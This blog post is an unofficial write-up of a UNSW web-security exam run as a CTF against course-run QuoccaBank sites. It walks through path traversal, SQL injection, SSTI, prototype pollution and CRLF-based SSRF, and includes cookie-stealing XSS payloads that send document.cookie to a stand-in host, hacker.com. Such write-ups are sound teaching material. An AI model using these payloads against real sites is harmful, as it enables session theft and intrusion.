project_path: /blog/_project.yaml
book_path: /blog/_book.yaml
description: A list of all CTF challenges that I wrote (keep updating)

{# updated_on: 2020-09-19 #}
{# published_on: 2020-09-19 #}
{# tags: ctf #}
{# featured_image: /blog/images/2020/09/quoccabank.svg #}
{# featured_snippet: My solutions for UNSW COMP6443/6843 Web Application Security 20T2 Final Exam #}

# COMP6443/6843 20T2 Final Exam Solutions

It was a lot of fun running and writing infrastructure/challenges for [COMP6443/6843](https://webcms3.cse.unsw.edu.au/COMP6443/20T2/), [UNSW](https://unsw.edu.au) and [SECedu](https://sec.edu.au/)'s Web Application Security course. [CTFProxy](https://github.com/adamyi/CTFProxy) worked really well to support our 100+ containers.

Since [solutions.quoccabank.com](https://solutions.quoccabank.com) will go down shortly after the course ends, here's an **unofficial** write-up for the final exam (solutions for fortnightly challenges are only released internally, in an attempt to prevent future plagiarism).

Different from other blog posts, this write-up is released under [Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License (CC BY-NC-SA 4.0)](https://creativecommons.org/licenses/by-nc-sa/4.0/legalcode). Unless otherwise stated, all code snippets here are open-sourced under [Apache 2.0 License](https://www.apache.org/licenses/LICENSE-2.0.txt).

I won't be answering questions regarding this unofficial write-up ~~because I'm lazy~~. If you are a student, please post your questions on Slack so other students can answer it and also learn from your questions.

## Exam Paper

The paper was served on [final.quoccabank.com](https://final.quoccabank.com). A copy is available to the public after the course ends [here](/blog/files/2020/09/comp6443_20t2_final.pdf)

This was a 4-hour exam.

## Challenge Authors

A huge thank you to my fellow course staff for putting together the exam!

**Section 1 (trivial warm-up)**

- qasa: [Adam Smallhorn](https://acsmallhorn.com/)
- pds: [Adam Smallhorn](https://acsmallhorn.com/)
- products: [Varun Chandramohan](https://www.linkedin.com/in/varun-chandramohan-8063686) and [Adam Yi](https://www.adamyi.com)
- logmein: [Norman Yue](https://www.linkedin.com/in/createremotethread)
- poemportal: [Abhijeth Dugginapeddi](https://twitter.com/abhijeth)

**Section 2**
- QuoccaOS: [Adam Yi](https://www.adamyi.com)

## Marking Methodology and Mark Distribution

I'm a huge believer in numbers so I took a purely applied math/statistics approach in marking. Check [my announcements on WebCMS3](https://webcms3.cse.unsw.edu.au/COMP6443/20T2/notices/) if you're interested.

## Unofficial Solutions

### qasa

Trivial recon challenge.

![screenshot](/blog/images/2020/09/qasa.png)

- **Flag 1** (naive IDOR): observe that 3.jpg and 5.jpg are missing from the gallery. Visiting /img/5.jpg yields a flag
- **Flag 2**: base64-encoded recon flag in HTTP response header
- **Flag 3**: Follow `Disallow: /8fda877f-38c4-4b1f-96b5-2d35f64220ba.php` in `robots.txt`
- **Flag 4**: There's a reversed flag in the cookie

### pds

Trivial LFI (Local File Inclusion) challenge.

![screenshot](/blog/images/2020/09/pds.png)

The PDS PDFs are served with `/file.php` endpoint, e.g. `/file.php?name=anz-v2.pdf`. We can inject the file path here.

- **Flag 1**: there's a free flag laying there in the HTML source code of `/index.php`
- **Flag 2**: source code uses test.txt as an example. Visit `/file.php?name=test.txt`
- **Flag 3**: source code refers to developers moving old PDFs to parent directory. Visit `/file.php?name=../cba-v2.pdf`
- **Flag 4**: `/file.php?name=../../.htaccess`
- **Flag 5**: `/file.php?name=../../file.php`
- **Flag 6**: `/file.php?name=../../.logs.txt` (found in `robots.txt`)
- **Flag 7**: `/file.php?name=../../../../etc/passwd`

### products

CSP Injection -> XSS

![screenshot](/blog/images/2020/09/products.png)

Use `<b>test</b>` to test. The search query is bolded - we have reflected XSS!

Note that this page is protected by CSP (Content-Security Policy):

```
    <meta
      http-equiv="Content-Security-Policy"
      content="
    default-src 'self';
    script-src 'nonce-661d93e0779b4a0fb8e5015c2f7c4ae1';
    img-src https://products.quoccabank.com/favicon.ico https://products.quoccabank.com/images/qb.svg;
    style-src https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css;"
    />
```

The input form offers the capability to change logo:

```
<!-- boss told me we should have eastern eggs. there's not enough memes @quoccabank. did you know we also have /images/quocca.jpg -->
<input type="hidden" name="logo" value="/images/qb.svg" />
```

If we change this to `/images/quocca.jpg`, the `img-src` in CSP gets modified to `img-src https://products.quoccabank.com/favicon.ico https://products.quoccabank.com/images/quocca.jpg;`. This means it's potentially vulnerable to injection.

Since `script-src` already exists before the `img-src` directive. We can't override `script-src`, but we can modify the new and more specific `script-src-attr` directive.

Some bad words are also filtered (but only removed by scanning once in the reflected query), but we can easily bypass this. E.g., if `script` is removed, we can use `scriscriptpt` to get `script`.

Final payload:

```
logo: ; script-src-attr 'unsafe-inline'; connect-src: https:;
search: <img src=x ononerrorerror=fetch('https://hacker.com/'+document.cookie)>
```

Report page to admin and profit :)

### logmein

Trivial crypto (since we didn't really cover any advanced crypto algorithms and vulnerabilities in the lecture)

```
<h2>I like logging in.</h2>

<form action="/" method="POST">
<table>
<tr>
  <td>Username</td><td><input name="username" type="text"></td>
</tr>
<tr>
  <td>Password</td><td><input name="password" type="text"></td>
</tr>
<tr>
  <td></td><td><input type="submit"></td>
</tr>
</table>
</form>

<!-- Stuck? What do you think might be the password for an account called "admin"? -->
```

- **Flag 1** (weak credentials): login with `admin/admin`. This gives us first flag and `Great job. The password hash of the second user, flag2, is 797cb93f8b1159e6dc68b2b7fddd6c55. Can you find the second flag?`
- **Flag 2**: Brute-force that hash (or just google it). It's md5 of `Password01`. Logging in with `flag2/Password01` yields second flag and `Now, try to log in as flag3. The password is a string, where md5(string) begins with XXXXXX`. XXXXXX is a randomly-generated 6-char string.

`flag3` actually accepts any string that results in the correct md5 prefix, not a fixed password. It's trivial to write a hash collision program.

<pre class="prettyprint">
package main

import (
	"crypto/md5"
	"encoding/hex"
	"fmt"
	"strconv"
	"strings"
)

func main() {
	i := 0
	for {
		i += 1
		s := strconv.Itoa(i)
		m := md5.Sum([]byte(s))
		mm := m[:]
		h := hex.EncodeToString(mm)
		if strings.HasPrefix(h, "e9e781") {
			fmt.Println(s)
			fmt.Println(h)
			break
		}
	}
}
</pre>

And we login with `flag3` to get the final flag.

### poemportal

Simple recon

Abhi disabled right-click with javascript... This is lame.

Anyway, this is in the source code:

```
<!-- Attackers used JavaScript to restrict access. Such a shame. They also use services like pastebin/github to share secret information. Use your Google hacking skills. Code word: mKLMd9mJ March 15, 2019 -->
<!-- COMP6443FINAL{maythesourcebewithyou.ejUyMzE1MjE=.jWiWEs8jixUHOzlAGQrliQ==}  -->
```

A simple google search gives us https://pastebin.com/mKLMd9mJ with 2 flags.

`robots.txt` also leaks `/admin/` path. It says in the comment:

```
<!-- You must be used to looking at page source by now!! This is to emphasize that client side validation is BAD. To build this login page, Abhijeth used an opensource project thanks to @mariofont. Looks like Abhijeth found some issues too. Use your recon skills -->
```

Google searching `mariofont php` gives us https://github.com/mariofont/PHP-Login. There's a flag in GitHub issue #8. The issue also mentions `Good job on using the php_hash function. The PHP standard documentation talks a lot about how to implement it. It also has some sample passwords.`

Logging in with default password listed on https://www.php.net/manual/en/function.password-verify.php gives us the final flag.

### QuoccaOS (Section 2)

This is a single-page javascript app written built with Google JSCompiler.

![screenshot](/blog/images/2020/09/qos.png)

```
<html>
  <!--
    I see you've reached the final challenge of the exam. Nice work!
    This huge bloated application was created totally not because i'm procrastinating to prepare for my aos exam...
    It has 4 apps with no way to switch back to main menu. Nor does it support concurrent/background userland programs
    because wHaT iS CoNteXT SwItCH, NeVeR HEarD oF iT, and this is JaVaScRiPt
    https://www.reddit.com/r/programminghumor/comments/d0kb4e/my_favourite_language/
    I'm told we should be nice to students so I enabled debug logging
    Enjoy :)
  -->
  <head>
    <script src="/qos.js"></script>
    <link rel="stylesheet" type="text/css" href="/qos.css" />
    <title>QuoccaOS</title>
  </head>
  <body>
    <div id="qos-wallpaper"></div>
    <div id="qos-container"></div>
    <script>
      com.quoccabank.qos.init();
    </script>
  </body>
</html>
```

#### Some recon to begin with

You can find a copy of the `qos.js` [here](https://gist.github.com/adamyi/2e27c6b685bf97df572b5f9524520125)

There's a trivial recon flag at the bottom of the javascript file.

This is the content of `/robots.txt`:

```
# secret portal
User-agent: *
Disallow: /admin

# debug
User-agent: *
Disallow: /debug/pprof

# bad people
User-agent: nsa
Disallow: /

# good people
User-agent: richard
Allow: /
User-agent: adamyi
Allow: /
User-agent: norman
Allow: /
```

Visiting `/admin` gives us this:

```
<form method="POST">
  Please enter secret portal password (this is long and not intended for brute
  force):
  <!-- SREs: configure this password in the new added cli flag -secret_portal_password -->
  <input type="password" name="pwd" />
  <input type="submit" />
</form>
```

We don't know the password, so moving on.

Visiting `/debug/pprof` yields 403 with `have you tried being a better hacker` message, hinting that this can be bypassed.

![have you tried being a better hacker](/blog/images/2020/09/qos_403.png)

In fact, it's just a trivial boolean `debug` value in the cookie. Change it from `0` to `1` to gain access. This gives us a golang debug/pprof profiling page with a flag

![pprof](/blog/images/2020/09/qos_pprof.png)

There are some interesting things found in the debug info. In goroutine stacktrace, we can find:

```
1 @ 0x4389c0 0x4078e7 0x4075ab 0x9102dd 0x4680e1
#	0x9102dc	main.serve_qos_dot_quoccabank_dot_com_slash_lmaolmaolmaolmaolmao+0x4c	challenges/final/qos/main.go:70
```

There's a flag on https://qos.quoccabank.com/lmaolmaolmaolmaolmao

We can also find the command line arguments used to invoke the server:

```
/app/challenges/final/qos/image.binary�-listen�0.0.0.0:80�-jwt_public_key�jwtkeys/jwt.pub�-secret_portal_password�what_could_possibly_go_wrong�-profile_renderer�challenges/final/qos/renderer�-profile_data�/data/profile/�-profile_render_timeout�2s
```

With this, we know the password is `what_could_possibly_go_wrong` and we can now login to `/admin/` to get a flag.

#### Login

If you try to login to qos, you'll see that it prompts wrong password without sending any request to the server so the password is verified on front-end.

Tracing through the source code, we can find this logic here:

<pre class="prettyprint">
function kf() {
    var a = bc(H("k-l"))
      , b = new Gc;
    b.c(a);
    a = Ob(b.j());
    "8f60992665ca6329da8bb3422b576de0" != a ? (K(hf, "password md5 check failed"),
    lf()) : (L(hf, "password is correct"),
    b = new xe,
    ue(b, 2, a),
    Fe(b, function(c, d) {
        c ? (K(hf, "login failed"),
        lf()) : (L(hf, Y(d, 2)),
        alert(Y(d, 2) + " (protip: you can copy this from console)"),
        ff())
    }))
}
</pre>

You don't have to brute-force this hash (it's not easily brute-forceable). Instead, just set a breakpoint here and modify `a`'s value during runtime. It sends hashed password to the server and this gives you second flag.

If you can't figure this out, the `Guest Login` button lets you log in without giving you this flag.

After logging in, there's an app selection screen with 4 apps.

![app launcher](/blog/images/2020/09/qos_apps.png)

#### LFI (Local File Inclusion)

Take the app image of handbook v1 as an example, its URL is https://qos.quoccabank.com/api/getappimage?f=handbookv1.png&signature=e0d5d92b7b808beead1cb3335b2e037cd2e79427. This makes people wonder if it's vulnerable to LFI, but first we need to reverse the signature algorithm.

This can be found in the source code:

```
function ef(a, b) {
    var c = df++
      , d = a.toLowerCase().replace(new RegExp(" ".replace(/([-()\[\]{}+?*.$\^|,:#<!\\])/g, "\\$1").replace(/\x08/g, "\\x08"),"g"), "".replace(/\$/g, "$$$$")) + ".png"
      , f = new Zc;
    f.c(d);
    f.c("_this_is_my_secret_salt");
    f = Ob(f.j());
    return {
        id: c,
        name: a,
        image: "/api/getappimage?f=" + d + "&signature=" + f,
        $: b
    }
}
```

You can create your own `Zc` object and call `.c` method to sign your own signature, or just try signing a simple string like `test` to fingerprint the algorithm. It turns out that it's just a simple `sha1(filename+"_this_is_my_secret_salt")`

With this, we can leak the content of the following files:

```
> https://qos.quoccabank.com/api/getappimage?f=../etc/passwd&signature=a8987fc83129fd881d84511e3501951b91d8c8dc
root:x:0:0:root:/root:/bin/bash
adamyi:x:0:0:COMP6443FINAL{CAN_WE_PORT_APP_STORE_TO_QOS_PLEASE.ejUyMzE1MjE=.7wBG2RkFiKbVVX9eBQFhfg==}:/home/adamyi:/bin/bash

> https://qos.quoccabank.com/api/getappimage?f=../etc/hosts&signature=7c5393fb2de9abb095fa63f4d2543d113607af94
127.0.0.1	qos.quoccabank.com qos localhost localhost.localdomain

# dev
127.0.0.1	qos-v2-dev-syd.quoccabank.com

> https://qos.quoccabank.com/api/getappimage?f=../root/.bash_history&signature=bc0d3b2a2640c0396fa0419964479265ce8b1e31
su adamyi

> https://qos.quoccabank.com/api/getappimage?f=../home/adamyi/.bash_history&signature=c42ac3a2ac87747b424e59bef578c1ae21600c37
wget https://qos.quoccabank.com/adamyi_backup.zip
```

Visiting https://qos-v2-dev-syd.quoccabank.com gives us another flag.

Download `adamyi_backup.zip` and it turns out to be an encrypted zip file. A simple google search tells us we can use john the ripper to brute-force its password, which turns out to be `12345`

#### handbook v1 (UNION-based SQL injection)

![handbook](/blog/images/2020/09/qos_handbook.png)

Handbook is a simple service that allows you to search for computer science courses at UNSW.

Using a `'` as query and we'll get this error: `Error 1064: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%' OR id LIKE '%'%'' at line 1` so this is vulnerable to SQL injection.

The system also replaces ` ` (space) to `NOSPACE` and `/**/` to `/BADHACKER/`. One can easily bypass this by substituting spaces with `/*a*/`.

Query `INFORMATION_SCHEMA` to get table schema. There are many fake flags in the `secrets` table, with one real flag.

Final payload:

```
'/*a*/UNION/*a*/SELECT/*a*/1,secret/*a*/FROM/*a*/secrets/*a*/WHERE/*a*/secret/*a*/NOT/*a*/LIKE/*a*/'%not-a-real%'#
```

#### handbook v2 (boolean-based SQL injection)

An upgraded version of handbook, with its api served over https://qos-handbook-v2.quoccabank.com/ instead of https://qos-handbook-v1.quoccabank.com/

`https://qos-handbook-v2.quoccabank.com/?query=algorithm` 302 redirects to `https://qos-handbook-v2.quoccabank.com/?query=algorithm&order_by=id`

We can no longer inject `query` but we can inject `order_by`

```
https://qos-handbook-v2.quoccabank.com/?query=algorithm&order_by=a

{"courses":[{"id":"ERROR00","title":"Error 1054: Unknown column 'a' in 'order clause'"},{"id":"PROTIP","title":"To save you some time, the db schema is the same as v1, and there's no more troll flags i promise"}],"success":0}
```

We can use boolean-based injection here.

- To confirm flag exists: `https://qos-handbook-v2.quoccabank.com/?query=&order=if((select(count(1))/*a*/from/*a*/secrets/*a*/where/*a*/secret/*a*/not/*a*/like/*a*/%27%25not-a-real-flag%25%27)=1,id,title)`
- To exfiltrate flag character by character: `https://qos-handbook-v2.quoccabank.com/?query=&order=if((select(substr(secret,1,14))/*a*/from/*a*/secrets/*a*/where/*a*/secret/*a*/not/*a*/like/*a*/%27%25not-a-real-flag%25%27)=%27COMP6443FINAL{%27,id,title)`

It's now trivial to write a binary search script.

#### Profile (SSTI -> XSS)

![profile](/blog/images/2020/09/qos_profile.png)

A straight-forward Server-Side Template Injection (SSTI) challenge without any filters.

**SSTI**

Use `{{ config }}` to dump Flask config and this contains a flag and the location of the next flag:

```
<Config {'JSON_AS_ASCII': True, 'USE_X_SENDFILE': False, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_NAME': 'session', 'MAX_COOKIE_SIZE': 4093, 'SESSION_COOKIE_SAMESITE': None, 'PROPAGATE_EXCEPTIONS': None, 'ENV': 'production', 'DEBUG': False, 'SECRET_KEY': "nice try! COMP6443FINAL{I_HEARD_YOU_COMPLAINING_THERE_IS_NO_SSTI_CHALLENGE_DURING_LECTURE_SO_HERE_YOU_GO.ejUyMzE1MjE=.SSBJHOxdKs4RKWS1Ycq7JQ==} there is another flag in flag.txt - go read it. this is a sandboxed environment - changes to any python struct will not be persistent across requests and you won't be able to read any files other than flag.txt.", 'EXPLAIN_TEMPLATE_LOADING': False, 'MAX_CONTENT_LENGTH': None, 'APPLICATION_ROOT': '/', 'SERVER_NAME': None, 'PREFERRED_URL_SCHEME': 'http', 'JSONIFY_PRETTYPRINT_REGULAR': False, 'TESTING': False, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'TEMPLATES_AUTO_RELOAD': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'JSON_SORT_KEYS': True, 'JSONIFY_MIMETYPE': 'application/json', 'SESSION_COOKIE_HTTPONLY': True, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200), 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'TRAP_HTTP_EXCEPTIONS': False}>
```

Dump content of `flag.txt` with the following payload:

```
{{ config.items()[4][1].__class__.__mro__[1].__subclasses__()[40]("flag.txt").read() }}
```

**XSS**

You can also report your profile to admin and there is a `profile_flag` cookie, hinting that this is also vulnerable to cross-site scripting (XSS).

Try with `<script>alert(1);</script>`, but it doesn't work! It's escaped. We got `<div class="r-s">&lt;script&gt;alert(1);&lt;/script&gt;</div>` displayed on the page.


Let's take a step back and trace through the code to render profile:

```
...
function Oe() {
    for (var a = bc(H("r-t")), b = new we, c = [], d = 0, f = 0; f < a.length; f++) {
        var g = a.charCodeAt(f);
        255 < g && (c[d++] = g & 255,
        g >>= 8);
        c[d++] = g
    }
    a = new Uint8Array(c);
    ue(b, 1, a);
    He(b)
}
...
function He(a) {
    Ie.a.I("/rpc/qos.QuoccaOS/SetProfile", a, {}, Ge, Je)
}
...
function Pc(a) {
    if (null == a || a.G !== Jc)
        if (a instanceof B) {
            var b = N;
            if (a instanceof B && a.constructor === B && a.c === Za)
                var c = a.b;
            else
                v("expected object of type SafeHtml, got '" + a + "' of type " + q(a)),
                c = "type_error:SafeHtml";
            a = b(c.toString(), a.a())
        } else
            a = N($a(String(String(a))), Oc(a));
    return a
}
function Je(a, b) {
    ...
    a = Qb("qos-container");
    ...
    d = '<div class="' + O("r-b") + '"><h1>Your profile</h1><div class="' + O("r-s") + '">' + Pc(d) + '</div><hr><textarea class="' + O("r-t") + '" rows="3">';
    ...
    b = b(d + c + '</textarea><br><button class="' + O("v-w") + " " + O("r-edit") + '">Save</button><button class="' + O("v-w") + " " + O("r-recommend") + '">Recommend my profile to admin</button></div>');
    a.innerHTML = b;
    J(H("r-edit"), "click", Oe);
    ...
...
}
```

The edit button sends template to `qos.QuoccaOS/SetProfile` RPC. The returned result is directly added to DOM tree by setting `innerHTML` of `qos-container`.

As mentioned in the prompt, QOS backend does escape the input. However note that the escape is done before sending to Jinja2. We can know this because Jinja2 automatically escape special characters by default, escaping after Jinja2 templating would cause double escaping. We can use the `| safe` pipe in Jinja2 to disable its escaping behaviour.

Now the question becomes, how do we get `<` and `>` characters in Jinja2's Python variables. We can't provide `<` or `>` in our input because it gets escaped and replaced before sending to Jinja2 (we can further verify this is the case with something like `{{'<'|length}}` which returns 4).

Recall that in our dumped Flask config, the config struct begins and ends with angle brackets. Look at the list of supported filters in Jinja2 [here](https://jinja.palletsprojects.com/en/2.10.x/templates/#builtin-filters). Some are particularly interesting:

- **string(object)**: Make a string unicode if it isn’t already. That way a markup string is not converted back to unicode.
- **safe(value)**: Mark the value as safe which means that in an environment with automatic escaping enabled this variable will not be escaped.
- **truncate(s, length=255, killwords=False, end='...', leeway=None)**: Return a truncated copy of the string.
- **reverse(value)**: Reverse the object or return an iterator that iterates over it the other way round.

We can cast the config struct to a string and truncate it to get angel brackets! Specifically, we can use `{{ config | string | truncate(1,True,'') | safe }}` to get a raw `<` and `{{ config | string | reverse | truncate(1,True,'') | safe }}` to get a raw `>`.

The remaining tasks now become staight-forward and obvious.

We can use `{{ config | string | truncate(1,True,'') | safe }}script{{ config | string | reverse | truncate(1,True,'') | safe }}alert(1);{{ config | string | truncate(1,True,'') | safe }}/script{{ config | string | reverse | truncate(1,True,'') | safe }}` to insert an unescaped `script` tag to the page, but this won't be executed as javascript because the DOM tree was already rendered.

Instead, we can use `<img src=x onerror=alert(1)>` to execute javascript.

Final payload: `{{ config | string | truncate(1,True,'') | safe }}img src=x onerror=fetch('https://hacker.com/'+document.cookie){{ config | string | reverse | truncate(1,True,'') | safe }}`

Report to admin and we get a flag

#### Tic Tac Toe

![tictactoe](/blog/images/2020/09/qos_tictactoe.png)

A simple [Tic-Tac-Toe](https://en.wikipedia.org/wiki/Tic-tac-toe) game served over [WebSocket](https://en.wikipedia.org/wiki/WebSocket).

Moves and results are sent in JSON.

![websocket traffic](/blog/images/2020/09/qos_websocket.png)

The attack surface is rather small. Let's see if we can crash the server with invalid input.

To modify the websocket requests, one can set up a MiTM proxy (e.g., with Burp Suite), write your own client script, or just add a javascript breakpoint and modify QuoccaOS runtime variables.

<pre class="prettyprint">
Te.prototype.c = function() {
    L(Se, "making move " + this.x + " " + this.y);
    if (this.a.classList.contains("x-y-z")) {
        var a = this.b
          , b = ed({
            x: this.x,
            y: this.y,
            p: a.f
        });
        a.a.m.send(b) // this is where you want to set a breakpoint
    } else
        L(Se, "no longer clickable")
}
;
</pre>


Forge `{"x":4,"y":4,"p":"O"}` to the server (position out of board boundary) and we get:

<pre class="prettyprint">
// qos.js:formatted:849  [369.096s] [com.quoccabank.qos.tictactoe] stack trace is hard so here's the source code:
// rip mdn (https://twitter.com/SteveALee/status/1293487542382333952)
// did you know proto? i heard you can even inject them https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/proto

const readline = require("readline");
const fs = require("fs");
const MemcacheClient = require("memcache-client");

const config = []; // TODO(adamyi): support custom configuration

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});

const code = fs.readFileSync(__filename);

const getLine = (function () {
  const getLineGen = (async function* () {
    for await (const line of rl) {
      yield line;
    }
  })();
  return async () => (await getLineGen.next()).value;
})();

var count = 0;
var matrix = [];
for (var i = 0; i < 3; i++) {
  matrix[i] = [null, null, null];
}

async function play() {
  try {
    var result = "d";
    for (var i = 0; i < 9; i++) {
      var req = JSON.parse(await getLine());
      if (matrix[req.x][req.y] != null) {
        result = "e";
        break;
      }
      matrix[req.x][req.y] = req.p;
      console.log(JSON.stringify({ res: "c", req: req }));
      if (
        (matrix[req.x][0] === matrix[req.x][1] &&
          matrix[req.x][1] === matrix[req.x][2]) ||
        (matrix[0][req.y] === matrix[1][req.y] &&
          matrix[1][req.y] === matrix[2][req.y]) ||
        (req.x == req.y &&
          matrix[0][0] === matrix[1][1] &&
          matrix[1][1] === matrix[2][2]) ||
        (req.x + req.y == 2 &&
          matrix[0][2] === matrix[1][1] &&
          matrix[1][1] === matrix[2][0])
      ) {
        result = req.p;
        if (i < 4) {
          // win with less than 5 steps, how is this even possible
          result = process.env.WIN5_FLAG;
        }
        if (i < 2) {
          // win with less than 3 steps, how is this even possible
          result = process.env.WIN3_FLAG;
        }
        break;
      }
    }
  } catch (err) {
    result = "e";
  }
  if (result == "e") {
    console.log(
      JSON.stringify({
        res: result,
        stacktrace: "stack trace is hard so here's the source code: " + code,
      })
    );
  } else {
    if (result != "d") {
      // increment winning count for our fancy scoreboard (it's not yet fully implemented)
      var server = "127.0.0.1:11211";
      if (config.server) {
        result =
          "weird this config function is still under development how did you set it? anyway here's a flag: " +
          process.env.CONFIG_FLAG;
        server = config.server;
      }
      // use player name (X/O) unless a dedicated scoreboard_name is specified
      var player = req.p;
      if (req.scoreboard_name) player = req.scoreboard_name;
      const client = new MemcacheClient({ server });
      try {
        // increment winning count
        await client.incr(player, 1, function (err, data) {
          result += " (win count: " + data + ")";
        });
      } catch (err) {}
    }
    console.log(
      JSON.stringify({
        res: result,
        /* advertisement: "we have a new game mode! https://qos-tictactoe.quoccabank.com/multiplayer", */ // disabled because it's still under development
      })
    );
  }
  process.exit(0);
}

play();
</pre>

With the source code, we now see that there are three flags - win with less than 3 steps, win with less than 5 steps, and change `config.server`. There's also an interesting multiplayer endpoint.

By default, the javascript switches between player `X` and player `O` but you can send your own requests all using player `X`. This way you can win with 3+ steps. This gives you the "win with less than 5 steps" flag.

The developer does a smart optimization here - instead of always checking global state to determine winning conditions, it only checks affected rows/columns:

<pre class="prettyprint">
if (
  (matrix[req.x][0] === matrix[req.x][1] &&
   matrix[req.x][1] === matrix[req.x][2]) ||
  (matrix[0][req.y] === matrix[1][req.y] &&
    matrix[1][req.y] === matrix[2][req.y]) ||
  (req.x == req.y &&
    matrix[0][0] === matrix[1][1] &&
    matrix[1][1] === matrix[2][2]) ||
  (req.x + req.y == 2 &&
    matrix[0][2] === matrix[1][1] &&
    matrix[1][1] === matrix[2][0])
)
</pre>

Previously when we set `req.x` to 4, this causes an exception, because we are dereferencing an undefined variable. We can observe that if we set `req.x` to `__proto__`, `matrix[req.x]` is defined and `matrix[req.x][0]` returns `undefined`. Now this is just checking `undefined === undefined` which returns `true`.

Therefore, by sending `{"x":"__proto__","y":0,"p":"X"}` to the server, we can win with just 1 step. We get the second flag.

We can also leverage [prototype pollution](https://portswigger.net/daily-swig/prototype-pollution-the-dangerous-and-underrated-vulnerability-impacting-javascript-applications) to change the undefined `server` attribute of `config` (an empty array). Send `{"x":"__proto__","y":"server","p":"127.0.0.1:80"}` to get the third flag.

Now the only remaining flag is the hardest flag in this exam.

Let's take a look at multiplayer!

![tic tac toe multiplayer mode](/blog/images/2020/09/qos_multiplayer.png)

We give it our server URL but get `under development, only accessible via http://127.0.0.1/multiplayer/newgame` error message. This means we need to somehow find a Server-side Request Forgery (SSRF) vulnerability on `qos-tictactoe` service.

Looking through the source code we dumped earlier, the only place it sends out a request is to connect to the Memcache server to increment winning count, but it's not using HTTP protocol.

However, Memcached is a plain-text-based TCP protocol! We might be able to smuggle HTTP traffic in.

A further examination of the [Memcached protocol](https://github.com/memcached/memcached/blob/master/doc/protocol.txt) indicates that it sends something like this to the server:

`incr <key> <value> [noreply]\r\n`

`<value>` is always 1 but we control the `<key>` here.

Let's review the source code of the [memcache-client](https://github.com/electrode-io/memcache/tree/master/packages/memcache-client) npm dependency.

<pre class="prettyprint">
// This code snippet is from https://github.com/electrode-io/memcache/blob/834320d17f6830ec604bca8350ff90259c5ac5de/packages/memcache-client/lib/client.js

// a convenient method to send a single line as a command to the server
// with \r\n appended for you automatically
cmd(data, options, callback) {
  return this.send(
    socket => {
      socket.write(data);
      if (options && options.noreply) {
        socket.write(" noreply\r\n");
      } else {
        socket.write("\r\n");
      }
    },
    options,
    callback
  );
}
// incr key by value, fire & forget with options.noreply
incr(key, value, options, callback) {
  return this.cmd(`incr ${key} ${value}`, options, callback);
}
</pre>

It's a really simple library and doesn't have any checks in it - it's vulnerable to CRLF injection! We can potentially have `\r\n` in our player name.

We can use this to connect to `127.0.0.1:80`. HTTP/1.1 supports request pipelining, i.e. it keeps TCP connection open across multiple requests. However we need to make sure no illegal request is sent. Otherwise the server returns a 400 and closes the connection.

We can now send the following request over:
```
incr / HTTP/1.1\r\n
Host: 127.0.0.1\r\n
\r\n
POST /multiplayer/newgame\r\n
Host: 127.0.0.1\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 31\r\n
\r\n
url=https%3A%2F%2Fhacker.com%2F\r\n
\r\n
 1\r\n
```

(although INCR is not a valid HTTP method, the golang server doesn't disconnect you... you can try this yourself by `curl -X INCR`)

Final payload: `{"x":"__proto__","y":"server","p":"127.0.0.1:80", "scoreboard_name": "/ HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\nPOST /multiplayer/newgame HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 31\r\n\r\nurl=https%3A%2F%2Fhacker.com%2F\r\n\r\n"}`

We get a URL sent to our server. Visiting that URL returns a flag.